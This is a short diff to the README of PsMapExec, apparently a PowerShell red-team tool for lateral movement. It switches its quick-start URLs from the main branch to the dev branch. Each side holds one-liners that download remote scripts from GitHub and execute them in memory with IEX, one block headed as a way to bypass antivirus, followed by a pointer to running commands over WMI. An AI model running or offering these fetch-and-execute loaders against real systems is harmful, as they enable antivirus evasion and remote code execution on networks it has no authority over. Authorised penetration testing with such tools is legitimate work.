@@ -28,11 +28,11 @@ Planned methods
 ## Quick Start
 ### Load the script directly into memory (Bypass AV)
 ```
-IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NETMongoose.ps1");IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NETMongoose.ps1");IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/dev/PsMapExec.ps1")
 ```
 ### Load the script directly into memory
 ```
-IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/dev/PsMapExec.ps1")
 ```
 \
 Execute some commands over WMI
